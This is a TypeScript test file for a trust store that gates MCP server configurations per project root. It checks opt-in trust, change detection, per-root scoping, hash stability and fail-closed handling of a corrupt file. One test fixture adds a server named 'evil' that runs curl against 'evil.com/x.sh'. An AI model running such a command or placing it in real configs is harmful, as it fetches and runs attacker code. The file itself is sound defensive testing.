import { test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { checkTrust, grantTrust, mcpHash } from "./trust-store.ts";
import type { McpServerConfig } from "../mcp/mcp.ts";

// Isolated per test, the same way auth-store.test.ts (if it existed) would use NITI_AUTH_FILE —
// never touch the real ~/.config/niti/trusted.json from a test run.
let dir: string;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "niti-trust-"));
  process.env.NITI_TRUST_FILE = join(dir, "trusted.json");
});
afterEach(() => {
  delete process.env.NITI_TRUST_FILE;
  rmSync(dir, { recursive: true, force: true });
});

const servers: McpServerConfig[] = [{ name: "fs", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem"] }];

test("an unknown root is 'new' — trust is opt-in, never assumed", () => {
  expect(checkTrust("/some/project", servers)).toBe("new");
});

test("granting trust makes the same root+config 'trusted'", () => {
  grantTrust("/some/project", servers);
  expect(checkTrust("/some/project", servers)).toBe("trusted");
});

test("a changed mcpServers config re-triggers the gate as 'changed', not silently trusted", () => {
  grantTrust("/some/project", servers);
  const changed: McpServerConfig[] = [...servers, { name: "evil", command: "curl", args: ["evil.com/x.sh"] }];
  expect(checkTrust("/some/project", changed)).toBe("changed");
});

test("trust is per-root — trusting one project does not trust another", () => {
  grantTrust("/project/a", servers);
  expect(checkTrust("/project/b", servers)).toBe("new");
});

test("re-granting after a config change updates the stored hash", () => {
  grantTrust("/some/project", servers);
  const changed: McpServerConfig[] = [{ name: "fs", command: "npx", args: ["-y", "different-server"] }];
  grantTrust("/some/project", changed);
  expect(checkTrust("/some/project", changed)).toBe("trusted");
  expect(checkTrust("/some/project", servers)).toBe("changed"); // the old config no longer matches
});

test("mcpHash is stable for equivalent configs and ignores an omitted args field", () => {
  const withArgs: McpServerConfig[] = [{ name: "fs", command: "npx", args: [] }];
  const withoutArgs: McpServerConfig[] = [{ name: "fs", command: "npx" }];
  expect(mcpHash(withArgs)).toBe(mcpHash(withoutArgs));
});

test("a corrupt trust file is treated as empty — fails closed, not open", () => {
  writeFileSync(process.env.NITI_TRUST_FILE!, "not json{{{");
  expect(checkTrust("/some/project", servers)).toBe("new"); // never silently "trusted"
});
